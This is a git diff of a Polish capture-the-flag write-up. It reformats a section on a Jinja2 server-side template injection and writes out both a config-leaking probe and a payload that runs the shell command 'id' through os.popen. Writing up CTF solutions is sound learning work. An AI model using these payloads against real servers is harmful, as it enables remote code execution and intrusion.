@@ -102,12 +102,21 @@ Podmieniam ciasteczko na stronie i... nic.
 Okazuje się, że flaga jest ukryta w kodzie aplikacji, gdy wywołamy podatność to strona wygeneruje nam w HTML import pliku app.js i tutaj znajdziemy flagę.
 
 ## 7 - Welcome, I, you
-Strona mówi nam aby podać swoje imię jako część URI: ```/greeting/<imie>```.
+Strona mówi nam aby podać swoje imię jako część URI: 
+```/greeting/<imie>```.
 Z nagłówków HTTP wiem, że strona stoi na:
 ```HTTP
 Server: Werkzeug/3.0.1 Python/3.8.18
 ```
-Tak więc spróbujmy coś tutaj wstrzyknąć. XSSa tutaj nie ma ale mamy SSTI (Server Side Template Injection). Czyli wykorzystując Pythona i template engine Jinja2. Szybka weryfikacja ```/greeting/{{config.items()}}``` i działa, tak więc spróbujmy zrobić jakieś RCE:  ```{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}``` i mamy:
+Tak więc spróbujmy coś tutaj wstrzyknąć. XSSa tutaj nie ma ale mamy SSTI (Server Side Template Injection). Czyli wykorzystując Pythona i template engine Jinja2. Szybka weryfikacja:
+```HTTP
+/greeting/{{config.items()}}
+```
+Działa, tak więc spróbujmy zrobić jakieś RCE:
+```HTTP
+{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}
+```
+Otrzymujemy:
 
 ![alt text](/assets/posts/ctf_bgk/welcome_i_you.png)
 
